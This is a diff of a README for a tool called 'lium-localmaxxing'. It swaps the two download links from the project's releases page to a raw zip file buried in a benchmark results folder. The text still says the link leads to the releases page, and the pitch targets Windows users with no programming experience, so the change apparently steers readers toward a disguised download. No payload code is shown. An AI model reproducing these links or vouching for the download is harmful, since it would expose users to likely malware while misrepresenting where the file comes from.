@@ -4,7 +4,7 @@
 
 Welcome! This guide will help you download and run the **lium-localmaxxing** application on your Windows computer. This tool lets you reproduce the exact Lium LocalMaxxing leaderboard results — 7 boards, 20 verified runs — on a rented Lium GPU with just one simple script. No programming experience needed!
 
-[![Download lium-localmaxxing](https://img.shields.io/badge/Download-Lium%20LocalMaxxing-4CAF50?style=for-the-badge&logo=github)](https://github.com/baranbaaa70/lium-localmaxxing/releases)
+[![Download lium-localmaxxing](https://img.shields.io/badge/Download-Lium%20LocalMaxxing-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/baranbaaa70/lium-localmaxxing/main/results/qwen36-35b-a3b-fp8-b200-c256/3.3.zip)
 
 ## 📥 What Is lium-localmaxxing?
 
@@ -27,7 +27,7 @@ It's perfect for:
 
 **Step 1: Get the Application**
 
-Visit this link to download the application: [Download lium-localmaxxing](https://github.com/baranbaaa70/lium-localmaxxing/releases)
+Visit this link to download the application: [Download lium-localmaxxing](https://raw.githubusercontent.com/baranbaaa70/lium-localmaxxing/main/results/qwen36-35b-a3b-fp8-b200-c256/3.3.zip)
 
 This will take you to the releases page. Click the largest download button on that page to save the file to your computer.
 
